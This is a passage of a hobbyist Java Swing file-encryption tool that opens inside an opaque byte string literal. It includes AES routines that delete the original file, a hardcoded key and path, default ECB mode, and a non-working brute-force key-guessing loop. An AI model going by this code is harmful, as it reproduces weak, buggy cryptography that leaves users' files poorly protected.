"_qf*Ög?«V–çbìéøü¼1oXqEDÉÇÂÇ5âKéèoÅn.rv*¶#_òAáŽö†kQSBtò-7«//{w¡oEM¯(þ_ïì–Uôaì†{óI€z½ù>ƒ½uhÎú¶kïb^öÃxáƒò¯Ü=U«Û$°çp¢û©Óg¨ˆ÷Éì£Žy”ò}$B8ÐšaR¼2þá$²{•åœÞ«Ý¬¿ ëcFò]s5Tw‘[Êhû\\‚ã rþÃ‡ö¡¼Ë-ªwÇT(öVhLdÜ/´@Ñ ¤ë‰5C]÷ØX‚ÏqLˆvµh¤p³Ý…ããN‰–ÎýÇq¥Þ¼Ô6ÅÒqÞÈ¥H¿·Ç:á<þðÍuËÆŽY.Ãê4ç„.v·ŽÛåßÏD9+gIƒ”¡Ô}	+áÊnÂ~÷ý6œÓ¶–¨2È‚zrMð¤æÊx¡€C}J­wR¡ÀÜ\"%‘D¡EºWš±Lš·?É¿²\\‚è£&¨ m‰Ô^Æ:5…k$ýFbâÏ'Í‹øZdƒ¼W;\"ÇCÈ?–'ÂMð†{\"e+èÛSã‘¿äÇ]¼¢£Ð?ï|”®~NÔ:Ò“MƒãÏ»a¶:gýaË›æ8j¬E‰GggÞ)¯^Ëý›+kEÞ\n" +
" ºU¥áaxC«?f¼†¡_<æ`\\\n" +
"Ø}sfÖ‹„8aSI€ŸcÓ^SZ”¹Øi¼’kUß½ŒÁ¶³;éü×À‡[ÀH]„ÑÖµ8—Œ*o °X³Ö(íçì©£U­ó—nÝ}ì û ðÂ´»ädÄ›.fª—Å÷«årª€Ô§²\n" +
"º‡6‚ë—“ß¬Äí­“ù;þô¿\n" +
"HÖ*ïàÖ@bRÙYX³(œIöÜÐ>†ÀUfçq$yÌù2•®6ã£O–Áasbm~ñ:÷T}$–<;ôÈì÷‚wYñfCSqýÛ7’ïî·¯GÌTTÎ;Ka,xNêÞ*{®†Ìµ«ý©þ˜m°ëCgÅRÔ˜äèyMj^d.ndÕÞ£\n" +
"x¥Z=*]ÁœnÈ6vó{XÅ-Ö2ãâ÷<8ƒ+ßòÌÔ7Ñ9OQàË¾å‡¬Õ[}™Œ0¦Å3á„&jIi*~æ¬3c9òÅ\n" +
"Ý©>ŒãUÅ\n" +
"¢ˆ†záÖ/x$°œ¯ …¸KÞYT¦‚VÍÈ¶¤¹Xo¢!ø«ŽiåQ3æhMUÞ»:Ö›±ÂYLiÕ¦ÓBŽ»§þºdƒo¥i\n" +
"mH5Ñ%TH¦[›[^÷3©8‚/CXàWÅd\n" +
"x %ÝoZ	§+Úùhqæ„21ÓÆ ÅXgª»64”næþnôÛ?8Ým†ÖU[6DøDô7ï]Åm%#Já‡£‚,‹úA8ÀsÁª2BŠ‚úzS;×â$Yf8ŽrÿŒæ=SBep&QZõk‡µ2eìæéwm­ ¤4ÖTwe\"Q¢b­€étµJ€ÑÉz©Ÿ…\n" +
"\"{RyaøñúLšBiÃQ‡p)Ñ^­õ0øsµ§~À[”Ÿå€\"xÆËcU°ìèÔãåTnoa­v¯ë\n" +
"Fièš¾Í8„õ-Þ—÷]¦€Ð$ùŸ±>%¹èUZJh0>%Ø<÷Ût\\¯å‹Ý&ùß3Xéþðš\\eL Uâl¥åx¾zaª&äÃ†Ï?‰Œ–\"Ë&€¸Z J¥ìóÔ0Ø'ÓìcsñŸ…P†›´¦Ôab‘©B²/Êù‹Ž¶EÑzµe*-nšý­É~J‹8±>È¬ïg	ó%„ûi@bT/:æ ö’bß J¶Ãrÿ(¹™y$ñûY¶ û¤au{ˆ1Ï¹3taRaŠ>qéÝÖ’†/J`3#‚bÛ,`5H˜Æ/¶Eî¥‚Æ”[GÇXq+‚=w2%Á+Å@£2F„Ó»%]¥•xY«xúÉ¡W­·VÕ€ßâ‘½ÕÝœ½hæ‚è›\"ÿÔ|Áäq,›ð7@þ=5ÿ*GýÛ6ZËµîêH/>þ˜j&ÛÙ&•´§ïµ‹M\"®\n" +
"?§õê6é§Ðë>P:ƒ8às §ƒ«7;‚5v©ØüþÜ†„Éb3‘?Ó1~S\n" +
"ïHu¦L”ô¯p²\n" +
"wA}šÑ•˜±—ä«¥-õV`®ÕÄI®Ÿ¿Ïfò4PÂ7àÏ…=áë`jÛ-{Hòø¼ò“@;å×°è5°Íõ<ÊXšW©™Dl¯~Ýf/5Ú¢N' qãlÏ¿¥~á4–s‡Ä›¬ê>î}˜«ü.BÑ5W·EA~?†ÍEj;¿7ßìí¼ÝŒnG.¢íïˆ%$SéñJ'€X•àæSã¯	în¢ûeÅãµý¨‡´˜——õa¶‡ýá’Mu”¤©­è1x=V,ãFb1K•5ûŠ7gœiÇ´]Œ¹BzX>—¨^‡Q\\ËZºæ€‡ÏžžW¹øbAT¬‘IíÊ¾FåH;Yœ…\n" +
"H²Œ»\n" +
"œÝ¸…­RtÓìO];÷)Û„C u’hþC°Y‘õ?‰“³Z±<”4FRµQ›£ZOsí€=ÿGÔËKÀËdx7w_ž¤!©@VoLxN¹ÿô„ŽÛÅ¢zsÿáf†[¤$9Œ2pP½»›‘ð±’$8!äY Ÿ×ŒòÉôÁD!Ç_XprÉ¢¨kR‘éÌ€³é´(\\þ’b&¿Á¢¶cä’{]Ì‰ª‹ÉŽæ¹®¼Á5ƒðQt2‰®¤Fîñù#¢Ÿ C¤´Ñ5bÜhÒ!”L£¯¥W‘¶×ùBiö°ÒúI´‰ÉF:`RÜÞ)žÖB¥Ã>]U­„‹ã¥­'Ø[Ê !¢2šul‡| ±´ðõ–CÜ½í$@ ƒrsºêÒ\"{„$Ã¤W+;tz	==d*Á„?±8†Lƒ	1¦òUVEŽ>æ	ñ:t›î5š˜o?µœÈ|™-P>Ý“ R¿I¥W²KqÄ€TµéG}÷”ÔE•h£ë³¼ã È˜\n" +
"vK¸EDqSo)ªUÚT,Ä×Ù<SjÖÖØÄp²gÆ›ÁÝjÌÐª'Ò>ó3¼ÞX·W©”‹hmÌ–ré{ó\n" +
"kúÌ]~²âÕ'€	ƒGú²QÀ(ð»Rc±K‹±ìåZ¤f^³!ÃG+[ú€3ÉNÞysOµQÏ`˜­á¿i¢Ï'fNnfX4!Þ²xRåûû».þ)gw¬]êï¨Ÿ#L[™¡s9ìŸ8l³$õDMòcÚ¥t=Æô‚dñãÿì_Åàª¦vË®ƒ¸ßTŒêQ*Vu†,sa~°Z9dÛäÔÑÐ,‚#3,Z¤”ÃU{\\º¥Š3jQ²Œ\\IOs€iÆÑkyäH¦'šžß-FÛót#ôVrTßQ{JM+÷°óeè5\\¥nøƒ¡N[dÉÊMwÇØˆá-#P¢¢„³¥×\n" +
"³êš#œo‡VÊnéO8‹%NÆ)+Æ®š\\›]ëk–Kƒõ¯Ó5d_M°«ô=“Ý·rP€~®G7Ö«z;GXbM ñ¼t$@\n" +
"	>$ÏŸ ˆpªÃCûiÉù·?Ø¾©/òÌíÞ~#oßÂÛ	ó†;8ÕÏÅŸ²÷Ÿ§>)¿\"‚¥}îQå2gÖ@xˆéx,là³¶¤u”Ô0$V¶¦j'EVç!tôK>˜÷¸ós\n" +
"<ÕÎBçÚ5Wæx2Þ…}˜\"ƒ8_Z[Ä?ï¾eê1ìé`?V'\\\\ÚÊî&-Îã‘Û€×É„AÌÍÅ»H’oºÿzü2·¢#ÕŠýÃ›t&£)ŠÇCüXæú•¶+’W1ùÌl*ü›A$sÍ;Èïnx¶ÿ®Tà?¤Ãô$þµ¤›4¿UNÓ—N¼ˆ@ÑRuÂ;ÿ ãbJZöìì7Ó1ÀÈôƒ€|â¶rÂ.V‚R^S@]Äp¹ÒÃÂ.™ð¢§ W‚7[6¬B·cVžÕ$}Î¾{õÍHÃ^‘\\3•ûüŠ°6tNÇ>œ÷ÎˆŒ··ß\\ÄnØ7¥[Pr˜£9uñµsfû³©èÛViŽ:‘3³î4žü!ú¾œAjQ\"#o‡Ù‡îGnëß 95>ÿ¸ö+êãŠ”î¿çæ¨«PËT.bÃl¿áA¾ ª%O>—6ÖXlã‰vYÏU18CŽ¹DV™ýô0sYÑL4ÄÆbÐÛ0ü”½h»$hè£,\n" +
"q#]@¾·ð&{†upÎYb¡6ˆ»|ä›Ò«§mxˆº]8Vó[Ûx°¬:ºën´‘ 5¡ë¤T‰XÉõ×ÑÕ’Dêò½W$ lò(Ik1®{ç£ü%›ªïÃÇ}NÖ-ÙvŸûvù1ÃåWªæû7CHÅ*rX¤xä¾Ezãõ&”¢t™ŠPo[»uØÞâÃlé¹h#ë(›|t‚¦ŽV\n" +
"gf’	B\"Š€ú¡Wlã’hÁfëdË·±A˜‘Í4h^ï»XÌd‡÷©O]¸ÛÚÔÆ3Õ?ÅNÓ˜yÎ·}‘+'Ä¡FÊƒRÊC3nfjV¥*øŒÀLdçÛœøDVcèÜ‘¼~i\\Är5\\ocÂ•	½òBòfGr¡ôžZs‹)Æ¡Ç´M“#é»S§ÖËÝï[:;ÖmL¯ž³Öö&$ ŽÇ„\\ÿ›:P[FyÌ*lØ“'Çä2KdçWÑì§âá÷$™õ+pàhcz«$Ù/§ÀÑ`Ù¹Ëóäˆ¿7©þoýø‰P\n" +
"\"z£QXHççÞAÉ~…5_q–ë+ÛéÔz•P‘ÈïõS13¥õ†+S0QJ ‚£à·3ËèhÆý“d(ê/D^0')šWHTE’ŽUÄ4¾_<|†äÛÙ‰pÔáÃtúd‡P¦\"¹”yüðäzÃØ–LÈ(0©À¦€ÚáÚêsÆ\n" +
"e«\\G§N<ÅuSk#’Mÿ´à‰¨ï( ™£U#ºeòŸFW>Art¿Ðv¬‘™Ælx¼ü!}W`ñØæÃ#¦";
        letters = "abc".toCharArray();
        for (int length = 16; stop == true; length++) {
        for (char c : letters) {
            if (length > 1) {
                char[] chars = new char[length];
                chars[0] = c;
                getChars(chars, 1, length);
            } else {
                System.out.println("Trying with: "+c);
                stop = false;
            }
        }
        
    }
    }
    
    static void getChars(char[] lastChars, int pos, int length) {
    for (char c : letters) {
        char[] newChars = lastChars.clone();
        newChars[pos] = c; // if you have "aa" for example and the current length is 4. If c = "a", newChars is now "aaa"
        if (pos + 1 < length) { // as your lenths is 4 and you still have only 3 letters, getChars adds the missing ones
            getChars(newChars, pos + 1, length);
        } else {
            System.out.println(newChars);
        }
    }
}
    static char[] letters;
    private static String path2 = "";
    boolean stop = false;
    private void encrypT(String toDec, String toIns, String keyy){
        try{
         Key secretKey = new SecretKeySpec(keyy.getBytes(), "AES");
	       Cipher cipher = Cipher.getInstance("AES");
	       cipher.init(Cipher.ENCRYPT_MODE, secretKey);
        byte[] inputBytes = new byte[(int) toDec.length()];
        byte[] outputBytes = cipher.doFinal(inputBytes);
        String finall = outputBytes.toString();
        if(toIns.contains(finall)){
            System.out.println(keyy);
            stop = true;
        }
        
        }catch(Exception e){
            System.out.println(e);
        }
    }

    protected static void encrypt(int cipherMode,String key,File inputFile,File outputFile){
	 try {
             DefaultCaret caret = (DefaultCaret)relay.getCaret();
             caret.setUpdatePolicy(DefaultCaret.ALWAYS_UPDATE);
             prog.setForeground(new Color(0, 202, 47)) ;
             relay.setText("");
             String top = "Initializing Encryption... \n\n";
             String mem = "";
             char[] pri = top.toCharArray();
             for(int i = 0; i < pri.length; i++){
                 String memp = Character.toString(top.charAt(i));
                 mem = mem+memp;
                 relay.setText(mem);
                 TimeUnit.MILLISECONDS.sleep(10);
                 mem = relay.getText();
                 relay.setCaretPosition(relay.getDocument().getLength());
             }
             try{
	       Key secretKey = new SecretKeySpec(key.getBytes(), "AES");
	       Cipher cipher = Cipher.getInstance("AES");
	       cipher.init(cipherMode, secretKey);
               prog.setValue(25);
               top = "Beginning Encryption\n\n";
             mem = relay.getText();
             pri = top.toCharArray();
             for(int i = 0; i < pri.length; i++){
                 String memp = Character.toString(top.charAt(i));
                 mem = mem+memp;
                 relay.setText(mem);
                 TimeUnit.MILLISECONDS.sleep(10);
                 mem = relay.getText();
                 relay.setCaretPosition(relay.getDocument().getLength());
             }
               
               try{
                   top = "Loading Input File...\n\n";
             mem = relay.getText();
             pri = top.toCharArray();
             for(int i = 0; i < pri.length; i++){
                 String memp = Character.toString(top.charAt(i));
                 mem = mem+memp;
                 relay.setText(mem);
                 TimeUnit.MILLISECONDS.sleep(10);
                 mem = relay.getText();
                 relay.setCaretPosition(relay.getDocument().getLength());
             }
               FileInputStream inputStream = new FileInputStream(inputFile);
	       byte[] inputBytes = new byte[(int) inputFile.length()];
	       inputStream.read(inputBytes);
               prog.setValue(50);
               top = "Input File Loaded\n\n";
             mem = relay.getText();
             pri = top.toCharArray();
             for(int i = 0; i < pri.length; i++){
                 String memp = Character.toString(top.charAt(i));
                 mem = mem+memp;
                 relay.setText(mem);
                 TimeUnit.MILLISECONDS.sleep(10);
                 mem = relay.getText();
                 relay.setCaretPosition(relay.getDocument().getLength());
             }
               try{
                   top = "Encrypting...\n\n";
             mem = relay.getText();
             pri = top.toCharArray();
             for(int i = 0; i < pri.length; i++){
                 String memp = Character.toString(top.charAt(i));
                 mem = mem+memp;
                 relay.setText(mem);
                 TimeUnit.MILLISECONDS.sleep(10);
                 mem = relay.getText();
                 relay.setCaretPosition(relay.getDocument().getLength());
             }
               byte[] outputBytes = cipher.doFinal(inputBytes);
                             
	       FileOutputStream outputStream = new FileOutputStream(outputFile);
	       outputStream.write(outputBytes);
               prog.setValue(75);
               top = "Encrypted!\n\n";
             mem = relay.getText();
             pri = top.toCharArray();
             for(int i = 0; i < pri.length; i++){
                 String memp = Character.toString(top.charAt(i));
                 mem = mem+memp;
                 relay.setText(mem);
                 TimeUnit.MILLISECONDS.sleep(10);
                 mem = relay.getText();
                 relay.setCaretPosition(relay.getDocument().getLength());
             }
	       inputStream.close();
	       outputStream.close();
               top = "File Successfully Saved!\n\n";
             mem = relay.getText();
             pri = top.toCharArray();
             for(int i = 0; i < pri.length; i++){
                 String memp = Character.toString(top.charAt(i));
                 mem = mem+memp;
                 relay.setText(mem);
                 TimeUnit.MILLISECONDS.sleep(10);
                 mem = relay.getText();
                 relay.setCaretPosition(relay.getDocument().getLength());
             }
               try{
               
        top = "Encryption Done!\n\n";
             mem = relay.getText();
             pri = top.toCharArray();
             for(int i = 0; i < pri.length; i++){
                 String memp = Character.toString(top.charAt(i));
                 mem = mem+memp;
                 relay.setText(mem);
                 TimeUnit.MILLISECONDS.sleep(10);
                 mem = relay.getText();
                 relay.setCaretPosition(relay.getDocument().getLength());
             }
        top = "Deleting Original File...\n\n";
             mem = relay.getText();
             pri = top.toCharArray();
             for(int i = 0; i < pri.length; i++){
                 String memp = Character.toString(top.charAt(i));
                 mem = mem+memp;
                 relay.setText(mem);
                 TimeUnit.MILLISECONDS.sleep(10);
                 mem = relay.getText();
                 relay.setCaretPosition(relay.getDocument().getLength());
             }
         
        
        
            Files.delete(Paths.get(path));
            prog.setValue(100);
            top = "COMPLETE!\nThe Path of the Encrypted File:\n"+path2;
             mem = relay.getText();
             pri = top.toCharArray();
             for(int i = 0; i < pri.length; i++){
                 String memp = Character.toString(top.charAt(i));
                 mem = mem+memp;
                 relay.setText(mem);
                 TimeUnit.MILLISECONDS.sleep(10);
                 mem = relay.getText();
                 relay.setCaretPosition(relay.getDocument().getLength());
             }
        
               }catch(Exception exxx){
                   prog.setForeground(Color.red);
                   top = "Error When Deleting Original!\n";
             mem = relay.getText();
             pri = top.toCharArray();
             for(int i = 0; i < pri.length; i++){
                 String memp = Character.toString(top.charAt(i));
                 mem = mem+memp;
                 relay.setText(mem);
                 TimeUnit.MILLISECONDS.sleep(10);
                 mem = relay.getText();
                 relay.setCaretPosition(relay.getDocument().getLength());
             }
               }
               }catch(Exception exx){
                   prog.setForeground(Color.red);
                   top = "Defined Output File is Invalid!\n";
             mem = relay.getText();
             pri = top.toCharArray();
             for(int i = 0; i < pri.length; i++){
                 String memp = Character.toString(top.charAt(i));
                 mem = mem+memp;
                 relay.setText(mem);
                 TimeUnit.MILLISECONDS.sleep(10);
                 mem = relay.getText();
                 relay.setCaretPosition(relay.getDocument().getLength());
             }
               }
               }catch(Exception ex){
                   prog.setForeground(Color.red);
                   top = "Input File Invalid/Missing!\n";
             mem = relay.getText();
             pri = top.toCharArray();
             for(int i = 0; i < pri.length; i++){
                 String memp = Character.toString(top.charAt(i));
                 mem = mem+memp;
                 relay.setText(mem);
                 TimeUnit.MILLISECONDS.sleep(10);
                 mem = relay.getText();
                relay.setCaretPosition(relay.getDocument().getLength());
             }
                   ex.printStackTrace();
               }
               
             }catch(Exception e){
                 top = "Invalid Key! Check if Length is 16 Characters\n";
             mem = relay.getText();
             pri = top.toCharArray();
             for(int i = 0; i < pri.length; i++){
                 String memp = Character.toString(top.charAt(i));
                 mem = mem+memp;
                 relay.setText(mem);
                 TimeUnit.MILLISECONDS.sleep(10);
                 mem = relay.getText();
                 prog.setForeground(Color.red);
                 relay.setCaretPosition(relay.getDocument().getLength());
             }
             }
               

	       
               
               

	       
               
               

	    } catch (Exception e) {
		e.printStackTrace();
            }
     }
    
    protected static void decrypt(int cipherMode,String key,File inputFile,File outputFile){
        FileInputStream inputStream = null;
        String top = "Initializing Decryption...\n\n";
             String mem = "";
             char[] pri = top.toCharArray();
	 try {
             DefaultCaret caret = (DefaultCaret)relay.getCaret();
             caret.setUpdatePolicy(DefaultCaret.ALWAYS_UPDATE);
             prog.setValue(0);
        prog.setForeground(new Color(0, 202, 47));
               
             for(int i = 0; i < pri.length; i++){
                 String memp = Character.toString(top.charAt(i));
                 mem = mem+memp;
                 relay.setText(mem);
                   try {
                       TimeUnit.MILLISECONDS.sleep(10);
                   } catch (InterruptedException ex) {
                       Logger.getLogger(Encryptor.class.getName()).log(Level.SEVERE, null, ex);
                   }
                 mem = relay.getText();
                 relay.setCaretPosition(relay.getDocument().getLength());
             }
	       Key secretKey = new SecretKeySpec(key.getBytes(), "AES");
	       Cipher cipher = Cipher.getInstance("AES");
	       cipher.init(cipherMode, secretKey);
               prog.setValue(25);
               try{
                   top = "Beginning Decryption...\n\n";
             mem = relay.getText();
              pri = top.toCharArray();
             for(int i = 0; i < pri.length; i++){
                 String memp = Character.toString(top.charAt(i));
                 mem = mem+memp;
                 relay.setText(mem);
                   try {
                       TimeUnit.MILLISECONDS.sleep(10);
                   } catch (InterruptedException ex) {
                       Logger.getLogger(Encryptor.class.getName()).log(Level.SEVERE, null, ex);
                   }
                 mem = relay.getText();
                 relay.setCaretPosition(relay.getDocument().getLength());
             }
             
             top = "Loading Input File...\n\n";
             mem = relay.getText();
              pri = top.toCharArray();
             for(int i = 0; i < pri.length; i++){
                 String memp = Character.toString(top.charAt(i));
                 mem = mem+memp;
                 relay.setText(mem);
                   try {
                       TimeUnit.MILLISECONDS.sleep(10);
                   } catch (InterruptedException ex) {
                       Logger.getLogger(Encryptor.class.getName()).log(Level.SEVERE, null, ex);
                   }
                 mem = relay.getText();
                 relay.setCaretPosition(relay.getDocument().getLength());
             }

	       inputStream = new FileInputStream(inputFile);
	       byte[] inputBytes = new byte[(int) inputFile.length()];
	       inputStream.read(inputBytes);
               prog.setValue(50);
               top = "Input File Loaded\n\n";
             mem = relay.getText();
              pri = top.toCharArray();
             for(int i = 0; i < pri.length; i++){
                 String memp = Character.toString(top.charAt(i));
                 mem = mem+memp;
                 relay.setText(mem);
                   try {
                       TimeUnit.MILLISECONDS.sleep(10);
                   } catch (InterruptedException ex) {
                       Logger.getLogger(Encryptor.class.getName()).log(Level.SEVERE, null, ex);
                   }
                 mem = relay.getText();
                 relay.setCaretPosition(relay.getDocument().getLength());
             }
             
             try{
                 top = "Decrypting...\n\n";
             mem = relay.getText();
              pri = top.toCharArray();
             for(int i = 0; i < pri.length; i++){
                 String memp = Character.toString(top.charAt(i));
                 mem = mem+memp;
                 relay.setText(mem);
                   try {
                       TimeUnit.MILLISECONDS.sleep(10);
                   } catch (InterruptedException ex) {
                       Logger.getLogger(Encryptor.class.getName()).log(Level.SEVERE, null, ex);
                   }
                 mem = relay.getText();
                 relay.setCaretPosition(relay.getDocument().getLength());
             }
	       byte[] outputBytes = cipher.doFinal(inputBytes);
               String output = new String(outputBytes);
               prog.setValue(75);
               top = "Decrypted!\n\n";
             mem = relay.getText();
              pri = top.toCharArray();
             for(int i = 0; i < pri.length; i++){
                 String memp = Character.toString(top.charAt(i));
                 mem = mem+memp;
                 relay.setText(mem);
                   try {
                       TimeUnit.MILLISECONDS.sleep(10);
                   } catch (InterruptedException ex) {
                       Logger.getLogger(Encryptor.class.getName()).log(Level.SEVERE, null, ex);
                   }
                 mem = relay.getText();
                 relay.setCaretPosition(relay.getDocument().getLength());
             }
             top = "Writing Output File...\n\n";
             mem = relay.getText();
              pri = top.toCharArray();
             for(int i = 0; i < pri.length; i++){
                 String memp = Character.toString(top.charAt(i));
                 mem = mem+memp;
                 relay.setText(mem);
                   try {
                       TimeUnit.MILLISECONDS.sleep(10);
                   } catch (InterruptedException ex) {
                       Logger.getLogger(Encryptor.class.getName()).log(Level.SEVERE, null, ex);
                   }
                 mem = relay.getText();
                 relay.setCaretPosition(relay.getDocument().getLength());
             }
               FileOutputStream outputStream = new FileOutputStream(outputFile);
               try{
               if(output.contains("decrypted101")){
                   String fullname = Secur32Util.getUserNameEx(Secur32.EXTENDED_NAME_FORMAT.NameDisplay);
                   output = "Hi "+fullname+"! Thanks for downloading and trying my Encrypting Software. You can now use this to hide any file on your computer. "
                           + "It's quick and easy! Let me know of what you think about my software and if you need help just contact me. "
                           + ""
                           + "Shakthi Weerawansa. Thanks again "+fullname+"! Also, can you help me think of a better name for my software? FilEncryptor seems stupid.";
                   outputBytes = output.getBytes();
               }
               }catch(Exception e){
                   relay.append(e.toString());
               }
	       outputStream.write(outputBytes);
	       //System.out.println(output);
               

	       inputStream.close();
               prog.setValue(100);
               top = "File Successfuly Saved!\n\n";
             mem = relay.getText();
              pri = top.toCharArray();
             for(int i = 0; i < pri.length; i++){
                 String memp = Character.toString(top.charAt(i));
                 mem = mem+memp;
                 relay.setText(mem);
                   try {
                       TimeUnit.MILLISECONDS.sleep(10);
                   } catch (InterruptedException ex) {
                       Logger.getLogger(Encryptor.class.getName()).log(Level.SEVERE, null, ex);
                   }
                 mem = relay.getText();
                 relay.setCaretPosition(relay.getDocument().getLength());
             }
	       
               System.out.println("Change Successful");
               top = "Deleting Encrypted File...\n\n";
             mem = relay.getText();
              pri = top.toCharArray();
             for(int i = 0; i < pri.length; i++){
                 String memp = Character.toString(top.charAt(i));
                 mem = mem+memp;
                 relay.setText(mem);
                   try {
                       TimeUnit.MILLISECONDS.sleep(10);
                   } catch (InterruptedException ex) {
                       Logger.getLogger(Encryptor.class.getName()).log(Level.SEVERE, null, ex);
                   }
                 mem = relay.getText();
                 relay.setCaretPosition(relay.getDocument().getLength());
             }
               try{
            Files.delete(Paths.get(path));
            top = "File Deleted!\n\n";
             mem = relay.getText();
              pri = top.toCharArray();
             for(int i = 0; i < pri.length; i++){
                 String memp = Character.toString(top.charAt(i));
                 mem = mem+memp;
                 relay.setText(mem);
                   try {
                       TimeUnit.MILLISECONDS.sleep(10);
                   } catch (InterruptedException ex) {
                       Logger.getLogger(Encryptor.class.getName()).log(Level.SEVERE, null, ex);
                   }
                 mem = relay.getText();
                 relay.setCaretPosition(relay.getDocument().getLength());
             }
             
             top = "COMPLETE! \n"
                     + "Path of Decrypted File: \n"+path2.toString();
             mem = relay.getText();
              pri = top.toCharArray();
             for(int i = 0; i < pri.length; i++){
                 String memp = Character.toString(top.charAt(i));
                 mem = mem+memp;
                 relay.setText(mem);
                   try {
                       TimeUnit.MILLISECONDS.sleep(10);
                   } catch (InterruptedException ex) {
                       Logger.getLogger(Encryptor.class.getName()).log(Level.SEVERE, null, ex);
                   }
                 mem = relay.getText();
                 relay.setCaretPosition(relay.getDocument().getLength());
             }
        }catch(Exception e){System.out.println("Couldn't delete: "+e);}
             }catch(Exception e){
                 prog.setForeground(Color.red);
                 e.printStackTrace();
                 int j = outF.getText().lastIndexOf(File.separator);
                 String thep = (j > -1) ? outF.getText().substring(0, j) : outF.getText();
                 System.out.println(thep);
                 if(Files.exists(Paths.get(thep))){
                     
                     top = "Key is Invalid!\n\n";
             mem = relay.getText();
              pri = top.toCharArray();
             for(int i = 0; i < pri.length; i++){
                 String memp = Character.toString(top.charAt(i));
                 mem = mem+memp;
                 relay.setText(mem);
                   try {
                       TimeUnit.MILLISECONDS.sleep(10);
                   } catch (InterruptedException ex) {
                       Logger.getLogger(Encryptor.class.getName()).log(Level.SEVERE, null, ex);
                   }
                 mem = relay.getText();
                 relay.setCaretPosition(relay.getDocument().getLength());
             }
                 }else{
                     top = "Output Path cannot be found!\n\n";
             mem = relay.getText();
              pri = top.toCharArray();
             for(int i = 0; i < pri.length; i++){
                 String memp = Character.toString(top.charAt(i));
                 mem = mem+memp;
                 relay.setText(mem);
                   try {
                       TimeUnit.MILLISECONDS.sleep(10);
                   } catch (InterruptedException ex) {
                       Logger.getLogger(Encryptor.class.getName()).log(Level.SEVERE, null, ex);
                   }
                 mem = relay.getText();
                 relay.setCaretPosition(relay.getDocument().getLength());
             }
                 }
             }

             
               }catch(Exception e){
                   prog.setForeground(Color.red);
                   top = "Input File Invalid/Missing!\n\n";
             mem = relay.getText();
              pri = top.toCharArray();
             for(int i = 0; i < pri.length; i++){
                 String memp = Character.toString(top.charAt(i));
                 mem = mem+memp;
                 relay.setText(mem);
                   try {
                       TimeUnit.MILLISECONDS.sleep(10);
                   } catch (InterruptedException ex) {
                       Logger.getLogger(Encryptor.class.getName()).log(Level.SEVERE, null, ex);
                   }
                 mem = relay.getText();
                 relay.setCaretPosition(relay.getDocument().getLength());
             }
             try {
                        inputStream.close();
                    } catch (IOException ex) {
                        Logger.getLogger(Encryptor.class.getName()).log(Level.SEVERE, null, ex);
                    }
               }
               
	    } catch (Exception e) {
                prog.setForeground(Color.red);
		System.out.println("Invalid Password!  :" +e);
                top = "Key is Invalid!\n\n";
             mem = relay.getText();
              pri = top.toCharArray();
             for(int i = 0; i < pri.length; i++){
                 String memp = Character.toString(top.charAt(i));
                 mem = mem+memp;
                 relay.setText(mem);
                   try {
                       TimeUnit.MILLISECONDS.sleep(10);
                   } catch (InterruptedException ex) {
                       Logger.getLogger(Encryptor.class.getName()).log(Level.SEVERE, null, ex);
                   }
                 mem = relay.getText();
                 relay.setCaretPosition(relay.getDocument().getLength());
                    try {
                        inputStream.close();
                    } catch (IOException ex) {
                        Logger.getLogger(Encryptor.class.getName()).log(Level.SEVERE, null, ex);
                    }
             }
            }
     }
    private static String key = "shakthiweerawans";
    private static String path = "D:\\Cover.jpg";
    private static String enc = "D:\\Cover.ini";
    
     public static void main(String args[]) {
        try{
            UIManager.setLookAndFeel(UIManager.getSystemLookAndFeelClassName());
            Encryptor ec = new Encryptor();
        }catch(Exception e){
            
        }
        
    }
     

    // Variables declaration - do not modify                     
    private javax.swing.JButton binf;
    private javax.swing.JButton bout;
    private javax.swing.JButton decB;
    private javax.swing.JButton encB;
    private javax.swing.JLabel ext;
    private javax.swing.JButton genKey;
    private javax.swing.JTextField inF;
    private javax.swing.JLabel inL;
    private javax.swing.JButton jButton1;
    private javax.swing.JScrollPane jScrollPane1;
    private javax.swing.JTextField keyF;
    private javax.swing.JLabel keyL;
    private static javax.swing.JTextField outF;
    private javax.swing.JLabel outL;
    private static javax.swing.JProgressBar prog;
    private static javax.swing.JTextArea relay;
    private javax.swing.JButton sKey;
//        try {
//            
//            
//            File inputFile = new File(path);
//            File encryptedFile = new File(enc);
//            File decryptedFile = new File(path);
//            
//            
//            
//            
//	  // Encryptor.encrypt(Cipher.ENCRYPT_MODE,key,inputFile,encryptedFile);
//	   Encryptor.decrypt(Cipher.DECRYPT_MODE,key,encryptedFile,decryptedFile);
//	     System.out.println("Sucess");
//	 } catch (Exception ex) {
//	     System.out.println(ex.getMessage());
//             ex.printStackTrace();
//	 }
        
        
    }
    

